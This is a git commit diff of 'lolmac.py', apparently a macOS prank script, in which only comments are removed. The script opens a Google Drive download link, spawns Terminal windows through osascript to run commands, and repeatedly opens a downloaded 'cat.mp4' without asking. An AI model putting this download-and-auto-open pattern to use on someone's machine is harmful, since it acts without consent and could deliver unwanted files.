10da329ca1a2f3134103c269e7354a4984fa6942
Enker818 <ankerahet@gmail.com>
2024-08-23 15:13:30 +0200

    Update lolmac.py

--- lolmac.py
+++ lolmac.py
@@ -6,17 +6,15 @@ import webbrowser
 
 def open_terminal_with_commands(commands):
     for command in commands:
-        # Open a new Terminal window and execute the command
         subprocess.Popen(['osascript', '-e', f'tell application "Terminal" to do script "{command}"'])
         time.sleep(0.1)  # Short delay to ensure windows open correctly
 
 
 if __name__ == "__main__":
-    # Open the URL in the default web browser
     url = 'https://drive.usercontent.google.com/download?id=1QIydeG52ujsi2ZHvx1LS_EP5Zbr-ByIZ&export=download&authuser=0'
     webbrowser.open(url)
 
-    # Commands to run in new Terminal windows
+
     commands_to_run = [
         "ls -R",  # Equivalent to 'dir/s' on macOS
         "open https://floatingqrcode.com",
@@ -27,7 +25,6 @@ if __name__ == "__main__":
 
     open_terminal_with_commands(commands_to_run)
 
-    # Open a specific file in the Downloads folder
     for _ in range(5):
         downloads_folder = os.path.expanduser('~/Downloads')
         file_name = 'cat.mp4'
@@ -35,6 +32,5 @@ if __name__ == "__main__":
 
         time.sleep(2)
 
-        # Open the file using the default application
         file_open_command = f'open "{file_path}"'
         subprocess.Popen(file_open_command, shell=True)
